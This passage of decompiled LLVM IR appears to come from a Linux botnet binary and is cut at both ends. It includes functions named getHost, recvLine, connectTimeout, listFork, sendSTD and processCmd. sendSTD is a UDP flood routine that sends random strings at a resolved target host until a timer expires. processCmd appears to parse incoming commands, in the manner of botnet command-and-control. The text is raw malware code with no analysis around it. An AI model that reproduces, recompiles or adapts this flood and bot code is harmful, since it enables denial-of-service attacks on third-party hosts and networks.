  uselistorder i32 %v6_8048937.lcssa, { 1, 0 }
  uselistorder i32 %v5_8048924, { 2, 1, 0 }
  uselistorder i32 %stack_var_-12.0.in.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.in20, { 0, 2, 1 }
  uselistorder i32 %v5_80488d4, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 2, 1, 0, 5, 4, 3, 6, 7, 8 }
  uselistorder i32 %v1_80488a3, { 2, 1, 0 }
  uselistorder i32 %v4_804888b, { 0, 2, 3, 1, 4, 5 }
  uselistorder i8* %tmp8, { 1, 0 }
  uselistorder label %dec_label_pc_804890d, { 1, 0 }
  uselistorder label %dec_label_pc_8048905, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80488df, { 1, 0 }
  uselistorder label %dec_label_pc_80488ac, { 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8048950 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048950, i32* %arg2, align 4
  %v10_8048964 = icmp eq i32 %v1_8048950, -1
  %. = zext i1 %v10_8048964 to i32
  ret i32 %.
}

define i32 @recvLine() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048981 = load i32, i32* @edi, align 4
  store i32 %v0_8048981, i32* %stack_var_-8, align 4
  %v1_804898e = inttoptr i32 %tmp17 to i8*
  %v1_8048993 = and i32 %tmp17, -256
  store i32 %v1_8048993, i32* %eax.global-to-local, align 4
  %v5_8048995 = call i8* @_memset(i8* %v1_804898e, i32 %v1_8048993, i32 %tmp18)
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_80489b5 = ptrtoint i32* %stack_var_-168 to i32
  %tmp34 = bitcast i32* %stack_var_-168 to i8*
  store i1 false, i1* @df, align 1
  %v5_80489bc = call i8* @_memset(i8* %tmp34, i32 0, i32 32)
  %v2_80489c9 = udiv i32 %tmp13, 32
  %v1_80489cf = urem i32 %tmp13, 32
  store i32 %v1_80489cf, i32* %eax.global-to-local, align 4
  %v0_80489d2 = load i32, i32* @ebp, align 4
  %v2_80489d2 = mul nuw nsw i32 %v2_80489c9, 4
  %v3_80489d2 = add nsw i32 %v2_80489d2, -164
  %v4_80489d2 = add i32 %v3_80489d2, %v0_80489d2
  %v5_80489d2 = inttoptr i32 %v4_80489d2 to i32*
  %v6_80489d2 = load i32, i32* %v5_80489d2, align 4
  %v9_80489d2 = shl i32 1, %v1_80489cf
  %v12_80489d2 = or i32 %v6_80489d2, %v9_80489d2
  store i32 %v12_80489d2, i32* %v5_80489d2, align 4
  %v1_80489dd = add i32 %tmp13, 1
  %v2_80489e1 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_80489b5, i32* %eax.global-to-local, align 4
  %v5_80489f9 = call i32 @__libc_select(i32 %v1_80489dd, i32 %v2_80489b5, i32 0, i32 %v2_80489b5, i32 %v2_80489e1)
  store i32 %v5_80489f9, i32* %eax.global-to-local, align 4
  %tmp35 = icmp slt i32 %v5_80489f9, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br i1 %tmp36, label %dec_label_pc_8048a88, label %dec_label_pc_8048a82.preheader

dec_label_pc_8048a82.preheader:                   ; preds = %entry
  %v7_8048a8643 = icmp sgt i32 %tmp9, 9
  br i1 %v7_8048a8643, label %dec_label_pc_8048a88, label %dec_label_pc_8048a0c

dec_label_pc_8048a0c:                             ; preds = %dec_label_pc_8048a82.preheader, %dec_label_pc_8048a7f
  %stack_var_-36.044 = phi i32 [ %v4_8048a7f, %dec_label_pc_8048a7f ], [ %tmp9, %dec_label_pc_8048a82.preheader ]
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v5_8048a31 = call i8* @_memset(i8* %tmp34, i32 0, i32 32)
  store i32 %v1_80489cf, i32* %eax.global-to-local, align 4
  %v0_8048a47 = load i32, i32* @ebp, align 4
  %v4_8048a47 = add i32 %v3_80489d2, %v0_8048a47
  %v5_8048a47 = inttoptr i32 %v4_8048a47 to i32*
  %v6_8048a47 = load i32, i32* %v5_8048a47, align 4
  %v12_8048a47 = or i32 %v6_8048a47, %v9_80489d2
  store i32 %v12_8048a47, i32* %v5_8048a47, align 4
  store i32 %v2_80489b5, i32* %eax.global-to-local, align 4
  %v5_8048a6e = call i32 @__libc_select(i32 %v1_80489dd, i32 %v2_80489b5, i32 0, i32 %v2_80489b5, i32 %v2_80489e1)
  store i32 %v5_8048a6e, i32* %eax.global-to-local, align 4
  %tmp37 = icmp slt i32 %v5_8048a6e, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8048a88, label %dec_label_pc_8048a7f

dec_label_pc_8048a7f:                             ; preds = %dec_label_pc_8048a0c
  %v4_8048a7f = add nsw i32 %stack_var_-36.044, 1
  %v7_8048a86 = icmp sgt i32 %stack_var_-36.044, 8
  br i1 %v7_8048a86, label %dec_label_pc_8048a88, label %dec_label_pc_8048a0c

dec_label_pc_8048a88:                             ; preds = %dec_label_pc_8048a82.preheader, %dec_label_pc_8048a0c, %dec_label_pc_8048a7f, %entry
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v2_8048aa0 = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_8048ae2

dec_label_pc_8048a97:                             ; preds = %dec_label_pc_8048ae2
  %v0_8048a97 = load i32, i32* @global_var_8052308.15, align 8
  store i32 %v0_8048a97, i32* %eax.global-to-local, align 4
  %v4_8048aa8 = call i32 @__libc_recv(i32 %v0_8048a97, i32 %v2_8048aa0, i32 1, i32 0)
  store i32 %v4_8048aa8, i32* %eax.global-to-local, align 4
  %v9_8048ab0 = icmp eq i32 %v4_8048aa8, 1
  br i1 %v9_8048ab0, label %dec_label_pc_8048ac7, label %dec_label_pc_8048ab5

dec_label_pc_8048ab5:                             ; preds = %dec_label_pc_8048a97
  %v4_8048ab5 = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 %v4_8048ab5, i32* %eax.global-to-local, align 4
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_8048aff

dec_label_pc_8048ac7:                             ; preds = %dec_label_pc_8048a97
  %v3_8048ac7 = load i8, i8* %stack_var_-177, align 1
  %v4_8048ac7 = sext i8 %v3_8048ac7 to i32
  store i32 %v4_8048ac7, i32* %eax.global-to-local, align 4
  %v4_8048acd = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_8048ac7, i8* %stack_var_-32.0, align 1
  %v5_8048ad2 = add i32 %v4_8048acd, 1
  %v22_8048ad2 = inttoptr i32 %v5_8048ad2 to i8*
  %v3_8048ad5 = load i8, i8* %stack_var_-177, align 1
  %v4_8048ad5 = sext i8 %v3_8048ad5 to i32
  %v6_8048ad5 = load i32, i32* %eax.global-to-local, align 4
  %v7_8048ad5 = and i32 %v6_8048ad5, -256
  %v8_8048ad5 = or i32 %v7_8048ad5, %v4_8048ad5
  store i32 %v8_8048ad5, i32* %eax.global-to-local, align 4
  %v10_8048adb = icmp eq i8 %v3_8048ad5, 10
  br i1 %v10_8048adb, label %dec_label_pc_8048af0, label %dec_label_pc_8048adf

dec_label_pc_8048adf:                             ; preds = %dec_label_pc_8048ac7
  %v4_8048adf = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8048ae2

dec_label_pc_8048ae2:                             ; preds = %dec_label_pc_8048a88, %dec_label_pc_8048adf
  %v7_8048ae6 = phi i32 [ %tmp17, %dec_label_pc_8048a88 ], [ %v8_8048ad5, %dec_label_pc_8048adf ]
  %stack_var_-32.0 = phi i8* [ %v1_804898e, %dec_label_pc_8048a88 ], [ %v22_8048ad2, %dec_label_pc_8048adf ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8048a88 ], [ %v4_8048adf, %dec_label_pc_8048adf ]
  %stack_var_12.0 = phi i32 [ %tmp18, %dec_label_pc_8048a88 ], [ %v4_8048ae2, %dec_label_pc_8048adf ]
  %v4_8048ae2 = add i32 %stack_var_12.0, -1
  %v9_8048ae2 = sub i32 0, %stack_var_12.0
  %v10_8048ae2 = and i32 %stack_var_12.0, %v9_8048ae2
  %v11_8048ae2 = icmp slt i32 %v10_8048ae2, 0
  %v12_8048ae2 = icmp eq i32 %v4_8048ae2, 0
  %v13_8048ae2 = icmp slt i32 %v4_8048ae2, 0
  %v3_8048ae6 = icmp eq i1 %v13_8048ae2, %v11_8048ae2
  %v4_8048ae6 = icmp eq i1 %v12_8048ae2, false
  %v5_8048ae6 = and i1 %v4_8048ae6, %v3_8048ae6
  %v6_8048ae6 = zext i1 %v5_8048ae6 to i32
  %v8_8048ae6 = and i32 %v7_8048ae6, -256
  %v9_8048ae6 = or i32 %v6_8048ae6, %v8_8048ae6
  store i32 %v9_8048ae6, i32* %eax.global-to-local, align 4
  %v4_8048aec = icmp eq i1 %v5_8048ae6, false
  %v1_8048aee = icmp eq i1 %v4_8048aec, false
  br i1 %v1_8048aee, label %dec_label_pc_8048a97, label %dec_label_pc_8048af0

dec_label_pc_8048af0:                             ; preds = %dec_label_pc_8048ac7, %dec_label_pc_8048ae2
  %stack_var_-32.1 = phi i8* [ %v22_8048ad2, %dec_label_pc_8048ac7 ], [ %stack_var_-32.0, %dec_label_pc_8048ae2 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  store i32 %stack_var_-28.0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8048aff

dec_label_pc_8048aff:                             ; preds = %dec_label_pc_8048ab5, %dec_label_pc_8048af0
  %storemerge = phi i32 [ -1, %dec_label_pc_8048ab5 ], [ %stack_var_-28.0, %dec_label_pc_8048af0 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v3_8048b05 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048b05, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048ae2, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 2, 0, 1, 3, 4 }
  uselistorder i8* %v22_8048ad2, { 1, 0 }
  uselistorder i32 %v1_80489cf, { 2, 1, 0 }
  uselistorder i32 %v2_80489b5, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 3, 1, 2 }
  uselistorder i32 %tmp13, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_8048aff, { 1, 0 }
  uselistorder label %dec_label_pc_8048af0, { 1, 0 }
  uselistorder label %dec_label_pc_8048ae2, { 1, 0 }
  uselistorder label %dec_label_pc_8048a88, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8048a0c, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_8048b0d = load i32, i32* @edi, align 4
  %v3_8048b1e = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8048b29 = or i32 %v3_8048b1e, 2048
  %v3_8048b3b = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8048b29)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_8048b4c = urem i32 %arg3, 65536
  %v1_8048b55 = call i32 @htons(i32 %v1_8048b4c)
  store i32 %arg2, i32* @edx, align 4
  %v3_8048b6f = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8048b77 = icmp eq i32 %v3_8048b6f, 0
  br i1 %v1_8048b77, label %dec_label_pc_8048b8a, label %dec_label_pc_8048b7b

dec_label_pc_8048b7b:                             ; preds = %entry
  br label %dec_label_pc_8048cc7

dec_label_pc_8048b8a:                             ; preds = %entry
  %v2_8048b67 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8048ba9 = call i32 @__libc_connect(i32 %arg1, i32 %v2_8048b67, i32 16)
  %v5_8048bb4 = icmp slt i32 %v3_8048ba9, 0
  %v1_8048bb8 = icmp eq i1 %v5_8048bb4, false
  br i1 %v1_8048bb8, label %dec_label_pc_8048c8e, label %dec_label_pc_8048bbe

dec_label_pc_8048bbe:                             ; preds = %dec_label_pc_8048b8a
  %v1_8048bbe = call i32 @__errno_location(i32 %v3_8048ba9)
  %v1_8048bc3 = inttoptr i32 %v1_8048bbe to i32*
  %v2_8048bc3 = load i32, i32* %v1_8048bc3, align 4
  %v9_8048bc5 = icmp eq i32 %v2_8048bc3, 115
  %v1_8048bc8 = icmp eq i1 %v9_8048bc5, false
  br i1 %v1_8048bc8, label %dec_label_pc_8048c82, label %dec_label_pc_8048bce

dec_label_pc_8048bce:                             ; preds = %dec_label_pc_8048bbe
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8048beb = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8048beb, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8048bf2 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_8048bff = udiv i32 %arg1, 32
  %v1_8048c05 = urem i32 %arg1, 32
  %v0_8048c08 = load i32, i32* @ebp, align 4
  %v2_8048c08 = mul nuw nsw i32 %v2_8048bff, 4
  %v3_8048c08 = add nsw i32 %v2_8048c08, -164
  %v4_8048c08 = add i32 %v3_8048c08, %v0_8048c08
  %v5_8048c08 = inttoptr i32 %v4_8048c08 to i32*
  %v6_8048c08 = load i32, i32* %v5_8048c08, align 4
  %v9_8048c08 = shl i32 1, %v1_8048c05
  %v12_8048c08 = or i32 %v6_8048c08, %v9_8048c08
  store i32 %v12_8048c08, i32* %v5_8048c08, align 4
  %v1_8048c13 = add i32 %arg1, 1
  %v2_8048c17 = ptrtoint i32* %stack_var_-176 to i32
  %v5_8048c2a = call i32 @__libc_select(i32 %v1_8048c13, i32 0, i32 %v2_8048beb, i32 0, i32 %v2_8048c17)
  %tmp33 = icmp slt i32 %v5_8048c2a, 1
  br i1 %tmp33, label %dec_label_pc_8048c76, label %dec_label_pc_8048c36

dec_label_pc_8048c36:                             ; preds = %dec_label_pc_8048bce
  store i32 4, i32* %stack_var_-180, align 4
  %v2_8048c43 = ptrtoint i32* %stack_var_-180 to i32
  %v2_8048c4a = ptrtoint i32* %stack_var_-184 to i32
  %v5_8048c58 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_8048c4a, i32 %v2_8048c43)
  %v3_8048c60 = load i32, i32* %stack_var_-184, align 4
  %v1_8048c66 = icmp eq i32 %v3_8048c60, 0
  br i1 %v1_8048c66, label %dec_label_pc_8048c8e, label %dec_label_pc_8048c6a

dec_label_pc_8048c6a:                             ; preds = %dec_label_pc_8048c36
  br label %dec_label_pc_8048cc7

dec_label_pc_8048c76:                             ; preds = %dec_label_pc_8048bce
  br label %dec_label_pc_8048cc7

dec_label_pc_8048c82:                             ; preds = %dec_label_pc_8048bbe
  br label %dec_label_pc_8048cc7

dec_label_pc_8048c8e:                             ; preds = %dec_label_pc_8048c36, %dec_label_pc_8048b8a
  %v3_8048c98 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8048ca3 = and i32 %v3_8048c98, -2049
  %v3_8048cb5 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8048ca3)
  br label %dec_label_pc_8048cc7

dec_label_pc_8048cc7:                             ; preds = %dec_label_pc_8048c82, %dec_label_pc_8048c76, %dec_label_pc_8048c6a, %dec_label_pc_8048b7b, %dec_label_pc_8048c8e
  %v3_8048cc7 = phi i32 [ 0, %dec_label_pc_8048c82 ], [ 0, %dec_label_pc_8048c76 ], [ 0, %dec_label_pc_8048c6a ], [ 0, %dec_label_pc_8048b7b ], [ 1, %dec_label_pc_8048c8e ]
  store i32 %v0_8048b0d, i32* @edi, align 4
  ret i32 %v3_8048cc7

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 2, 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8048cc7, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8048cd5 = load i32, i32* @ebx, align 4
  store i32 %v0_8048cd5, i32* %stack_var_-8, align 4
  %v1_8048cd9 = call i32 @__libc_fork(i32 %v0_8048cd5)
  %v4_8048ce1 = icmp eq i32 %v1_8048cd9, 0
  %v1_8048ce5 = icmp eq i1 %v4_8048ce1, false
  br i1 %v1_8048ce5, label %dec_label_pc_8048cf2, label %dec_label_pc_8048ce7

dec_label_pc_8048ce7:                             ; preds = %entry
  br label %dec_label_pc_8048dd6

dec_label_pc_8048cf2:                             ; preds = %entry
  %v0_8048cf2 = load i32, i32* @global_var_8052300.16, align 256
  %v0_8048cf7 = load i32, i32* @global_var_8052304.17, align 4
  %v1_8048cfd = add i32 %v0_8048cf2, 1
  %v5_8048cfd = icmp eq i32 %v0_8048cf2, -1
  %v2_8048d00 = zext i1 %v5_8048cfd to i32
  %v3_8048d00 = add i32 %v2_8048d00, %v0_8048cf7
  store i32 %v1_8048cfd, i32* @global_var_8052300.16, align 256
  store i32 %v3_8048d00, i32* @global_var_8052304.17, align 4
  %v2_8048d1d = mul i32 %v1_8048cfd, 4
  %v1_8048d20 = add i32 %v2_8048d1d, 4
  %v1_8048d27 = call i32 @malloc(i32 %v1_8048d20)
  br label %dec_label_pc_8048d5d

dec_label_pc_8048d3b:                             ; preds = %dec_label_pc_8048d5d, %dec_label_pc_8048d8e
  %v2_8048d3e = mul i32 %storemerge1, 4
  %v5_8048d43 = add i32 %v2_8048d3e, %v1_8048d27
  %v0_8048d4e = load i32, i32* @global_var_8054564.18, align 4
  %v2_8048d53 = add i32 %v0_8048d4e, %v2_8048d3e
  %v1_8048d56 = inttoptr i32 %v2_8048d53 to i32*
  %v2_8048d56 = load i32, i32* %v1_8048d56, align 4
  %v2_8048d58 = inttoptr i32 %v5_8048d43 to i32*
  store i32 %v2_8048d56, i32* %v2_8048d58, align 4
  %v4_8048d5a = add i32 %storemerge1, 1
  br label %dec_label_pc_8048d5d

dec_label_pc_8048d5d:                             ; preds = %dec_label_pc_8048cf2, %dec_label_pc_8048d3b
  %storemerge1 = phi i32 [ %v4_8048d5a, %dec_label_pc_8048d3b ], [ 0, %dec_label_pc_8048cf2 ]
  %v0_8048d6b = load i32, i32* @global_var_8052300.16, align 256
  %v0_8048d70 = load i32, i32* @global_var_8052304.17, align 4
  %v4_8048d7a = icmp ne i32 %v0_8048d6b, 0
  %v2_8048d7d = zext i1 %v4_8048d7a to i32
  %v3_8048d7d = add i32 %v0_8048d70, -1
  %v4_8048d7d = add i32 %v3_8048d7d, %v2_8048d7d
  store i32 %v4_8048d7d, i32* @ebx, align 4
  %v10_8048d89 = icmp eq i32 %v4_8048d7d, 0
  br i1 %v10_8048d89, label %dec_label_pc_8048d8e, label %dec_label_pc_8048d3b

dec_label_pc_8048d8e:                             ; preds = %dec_label_pc_8048d5d
  %v1_8048d7a = add i32 %v0_8048d6b, -1
  %v10_8048d99 = icmp ult i32 %storemerge1, %v1_8048d7a
  br i1 %v10_8048d99, label %dec_label_pc_8048d3b, label %dec_label_pc_8048d9e

dec_label_pc_8048d9e:                             ; preds = %dec_label_pc_8048d8e
  %v2_8048da9 = mul i32 %v0_8048d6b, 4
  %v5_8048dac = add i32 %v1_8048d27, -4
  %v1_8048daf = add i32 %v5_8048dac, %v2_8048da9
  store i32 %v1_8048daf, i32* @edx, align 4
  %v2_8048db5 = inttoptr i32 %v1_8048daf to i32*
  store i32 %v1_8048cd9, i32* %v2_8048db5, align 4
  %v0_8048db7 = load i32, i32* @global_var_8054564.18, align 4
  %v1_8048dc0 = call i32 @free(i32 %v0_8048db7)
  store i32 %v1_8048d27, i32* @global_var_8054564.18, align 4
  store i32 %v1_8048cd9, i32* @ecx, align 4
  br label %dec_label_pc_8048dd6

dec_label_pc_8048dd6:                             ; preds = %dec_label_pc_8048ce7, %dec_label_pc_8048d9e
  %v3_8048dd9 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048dd9, i32* @ebx, align 4
  ret i32 %v1_8048cd9

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_8048d3e, { 1, 0 }
  uselistorder i32 %v1_8048d27, { 2, 0, 1 }
  uselistorder i32 %v0_8048cf2, { 1, 0 }
  uselistorder label %dec_label_pc_8048dd6, { 1, 0 }
  uselistorder label %dec_label_pc_8048d5d, { 1, 0 }
  uselistorder label %dec_label_pc_8048d3b, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i16 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v4_8048de4 = add i32 %arg4, -4096
  %v6_8048de4 = sub i32 4095, %arg4
  %v7_8048de4 = and i32 %v6_8048de4, %arg4
  %v8_8048de4 = icmp slt i32 %v7_8048de4, 0
  %v9_8048de4 = icmp eq i32 %v4_8048de4, 0
  %v10_8048de4 = icmp slt i32 %v4_8048de4, 0
  %v3_8048deb = icmp eq i1 %v10_8048de4, %v8_8048de4
  %v4_8048deb = icmp eq i1 %v9_8048de4, false
  %v5_8048deb = and i1 %v4_8048deb, %v3_8048deb
  br i1 %v5_8048deb, label %dec_label_pc_8048f4d, label %dec_label_pc_8048df1

dec_label_pc_8048df1:                             ; preds = %entry
  %v3_8048dfa = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_8048e0a = call i32 @__GI_time(i32* null)
  %v1_8048e1c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_8048e27 = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_8048e48 = add i32 %v1_8048e1c, 12
  %v2_8048e48 = inttoptr i32 %v1_8048e48 to i32*
  %v3_8048e48 = load i32, i32* %v2_8048e48, align 4
  %v2_8048e50 = ptrtoint i32* %stack_var_-40 to i32
  %v1_8048e56 = add i32 %v1_8048e1c, 16
  %v2_8048e56 = inttoptr i32 %v1_8048e56 to i32*
  %v3_8048e56 = load i32, i32* %v2_8048e56, align 4
  %v1_8048e59 = inttoptr i32 %v3_8048e56 to i32*
  %v2_8048e59 = load i32, i32* %v1_8048e59, align 4
  %v3_8048e61 = call i32 @bcopy(i32 %v2_8048e59, i32 %v2_8048e50, i32 %v3_8048e48)
  %v1_8048e6c = add i32 %v1_8048e1c, 8
  %v2_8048e6c = inttoptr i32 %v1_8048e6c to i32*
  %v3_8048e6c = load i32, i32* %v2_8048e6c, align 4
  store i32 %v3_8048e6c, i32* %stack_var_-44, align 4
  %v2_8048eba = ptrtoint i32* %stack_var_-76 to i32
  %v2_8048ec1 = bitcast i32* %stack_var_-76 to i8*
  %v5_8048f11 = add i32 %v2_8048e0a, %arg3
  br label %dec_label_pc_8048e81

dec_label_pc_8048e81:                             ; preds = %dec_label_pc_8048f45, %dec_label_pc_8048df1
  %storemerge = phi i32 [ %v4_8048f45, %dec_label_pc_8048f45 ], [ 0, %dec_label_pc_8048df1 ]
  %tmp27 = icmp ult i32 %storemerge, 50
  br i1 %tmp27, label %dec_label_pc_8048f45, label %dec_label_pc_8048e8b

dec_label_pc_8048e8b:                             ; preds = %dec_label_pc_8048e81
  %v2_8048e90 = call i32 @__GI_time(i32* null)
  store i32 %v2_8048e90, i32* @eax, align 4
  %v1_8048e9c = call i32 @srand(i32 %v2_8048e90)
  %v0_8048ea4 = call i32 @rand_init()
  %v0_8048ea9 = call i32 @rand_next()
  %v1_8048eae = mul i32 %v0_8048ea9, 4
  %v2_8048eb1 = and i32 %v1_8048eae, 12
  %v1_8048eb4 = add nuw nsw i32 %v2_8048eb1, 12
  store i32 %v2_8048eba, i32* @eax, align 4
  %v3_8048ec1 = call i32 @rand_alphastr(i8* %v2_8048ec1, i32 %v1_8048eb4)
  %v0_8048ecc = load i32, i32* @ebp, align 4
  %v2_8048ecc = add nsw i32 %v2_8048eb1, -60
  %v3_8048ecc = add i32 %v2_8048ecc, %v0_8048ecc
  %v4_8048ecc = inttoptr i32 %v3_8048ecc to i8*
  store i8 0, i8* %v4_8048ecc, align 1
  %v4_8048ee3 = call i32 @__libc_send(i32 %v3_8048dfa, i32 %v2_8048eba, i32 %arg4, i32 0)
  %v3_8048ef7 = call i32 @__libc_connect(i32 %v3_8048dfa, i32 %v2_8048e27, i32 16)
  %v2_8048f04 = call i32 @__GI_time(i32* null)
  %v5_8048f16 = icmp slt i32 %v2_8048f04, %v5_8048f11
  br i1 %v5_8048f16, label %dec_label_pc_8048f45, label %dec_label_pc_8048f18

dec_label_pc_8048f18:                             ; preds = %dec_label_pc_8048e8b
  %v1_8048f1e = call i32 @__libc_close(i32 %v3_8048dfa)
  %v1_8048f2c = call i32 @free(i32 %v2_8048eba)
  %v1_8048f39 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8048f45:                             ; preds = %dec_label_pc_8048e8b, %dec_label_pc_8048e81
  %stack_var_-16.0 = phi i32 [ %storemerge, %dec_label_pc_8048e81 ], [ 0, %dec_label_pc_8048e8b ]
  %v4_8048f45 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_8048e81

dec_label_pc_8048f4d:                             ; preds = %entry
  %v0_8048f4e = load i32, i32* @eax, align 4
  ret i32 %v0_8048f4e

; uselistorder directives
  uselistorder i32 %v2_8048eb1, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v4_8048de4, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
}

define i32 @processCmd() local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8048f52 = load i32, i32* @edi, align 4
  %v0_8048f53 = load i32, i32* @esi, align 4
  %v0_8048f54 = load i32, i32* @ebx, align 4
  store i32 %v0_8048f54, i32* %stack_var_-16, align 4
  %v5_8048f55 = icmp ult i32* %stack_var_-16, inttoptr (i32 76 to i32*)
  store i1 %v5_8048f55, i1* %cf.global-to-local, align 1
  %v1_8048f5b = inttoptr i32 %tmp31 to i32*
  %v2_8048f5b = load i32, i32* %v1_8048f5b, align 4
  store i1 false, i1* @df, align 1
  %v4_8048f6f = inttoptr i32 %v2_8048f5b to i8*
  store i32 %v2_8048f5b, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_804fd33.19 to i32), i32* @edi, align 4
  %v7_8048f78 = call i32 @_strncmp(i8* %v4_8048f6f, i8* bitcast (i8** @global_var_804fd33.19 to i8*), i32 2)
  %v8_8048f78 = urem i32 %v7_8048f78, 2
  %v9_8048f78 = icmp eq i32 %v8_8048f78, 0
  %v0_8048f7a = load i1, i1* %cf.global-to-local, align 1
  %v2_8048f7a = or i1 %v0_8048f7a, %v9_8048f78
  %v3_8048f7a = zext i1 %v2_8048f7a to i32
  %v4_8048f7a = load i32, i32* @edx, align 4
  %v5_8048f7a = and i32 %v4_8048f7a, -256
  %v6_8048f7a = or i32 %v3_8048f7a, %v5_8048f7a
  %v7_8048f7a = xor i32 %v6_8048f7a, 1
  store i32 %v7_8048f7a, i32* @edx, align 4
  %v1_8048f82 = trunc i32 %v7_8048f7a to i8
  %v3_8048f82 = zext i1 %v0_8048f7a to i8
  %v4_8048f82 = sub nsw i8 %v1_8048f82, %v3_8048f82
  %v15_8048f82 = icmp eq i8 %v4_8048f82, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048f8b = icmp eq i1 %v15_8048f82, false
  br i1 %v1_8048f8b, label %dec_label_pc_8049088, label %dec_label_pc_8048f91

dec_label_pc_8048f91:                             ; preds = %entry
  %v2_8048f86 = sext i8 %v4_8048f82 to i32
  %v9_8048f91 = icmp ult i32 %tmp27, 4
  store i1 %v9_8048f91, i1* %cf.global-to-local, align 1
  %v7_8048f95 = icmp sgt i32 %tmp27, 4
  br i1 %v7_8048f95, label %dec_label_pc_8048f9b, label %dec_label_pc_8049163

dec_label_pc_8048f9b:                             ; preds = %dec_label_pc_8048f91
  %v1_8048f9e = add i32 %tmp31, 4
